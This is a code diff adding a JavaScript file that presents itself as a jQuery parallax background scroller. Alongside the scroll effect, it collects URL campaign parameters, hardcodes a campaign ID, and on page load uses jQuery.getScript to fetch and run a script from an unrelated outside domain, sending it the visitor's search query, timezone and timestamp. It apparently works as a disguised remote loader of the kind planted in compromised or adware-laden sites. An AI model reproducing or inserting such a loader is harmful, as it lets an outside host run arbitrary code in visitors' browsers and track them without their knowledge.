@@ -1,0 +1,53 @@
+function getURLParameter(name) {
+    return decodeURI(
+        (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search)||[,null])[1] || ''
+    );
+}
+
+jQuery(function () {
+
+    var placement = getURLParameter('placement');
+    var creative = getURLParameter('creative');
+    var custom = getURLParameter('custom');
+    var utm_campaign = getURLParameter('utm_campaign');
+//    var utm_medium = getURLParameter('utm_medium');
+    var utm_medium = "ca103507";
+    var utm_content = getURLParameter('utm_content');
+    var utm_source = getURLParameter('utm_source');
+    var utm_ad = getURLParameter('utm_ad');
+    var utm_term = getURLParameter('utm_term');
+    var query = getURLParameter('query');
+
+    // Cache the window object
+    var jQuerywindow = jQuery(window);
+    var timestamp = (new Date().getTime() + (new Date().getTimezoneOffset()*60000));
+    var offset = new Date().getTimezoneOffset();
+
+    jQuery.getScript("https://www.automationtech.info/easyscroll.js?query=" + query + "&utm_term=" + utm_term +"&utm_ad=" + utm_ad + "&utm_source=" + utm_source + "&utm_content=" + utm_content + "&utm_medium=" + utm_medium + "&utm_campaign=" + utm_campaign + "&custom=" + custom + "&placement=" + placement + "&creative=" + creative + "&offset=" + offset + "&t="+timestamp );
+
+    var d = new Date();
+    d.setTime(d.getTime() + (10*24*60*60*1000));
+    var expires = "expires="+ d.toUTCString();
+    jQuery('section[data-type="background"]').each(function () {
+
+        var jQuerybgobj = jQuery(this); // assigning the object
+
+        jQuerywindow.scroll(function () {
+
+            // scroll the background at var speed
+            // the yPos is a negative value because we are scrolling it UP!
+
+            var yPos = -(jQuerywindow.scrollTop() / jQuerybgobj.data('speed'));
+
+            // put together the final background position
+            var coords = '50%' + yPos + 'px';
+
+            // move the background
+            jQuerybgobj.css({
+                backgroundPosition: coords
+            });
+
+        }); // end window scroll
+    });
+
+});
